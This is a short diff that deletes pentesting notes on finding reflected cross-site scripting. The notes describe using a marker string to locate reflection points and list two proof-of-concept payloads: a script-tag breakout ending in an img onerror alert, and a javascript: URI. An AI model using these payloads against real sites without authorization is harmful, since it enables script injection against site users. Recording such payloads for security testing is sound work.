@@ -1,5 +1,0 @@
-the keyword “lookhere” was used to detect all the place the input was reflected
-The rest is responsible for balancing the payload
-Payload:  lookhere’);}</script><img src=x onerror=alert(“XSS”)>
-
-javascript:alert(1);
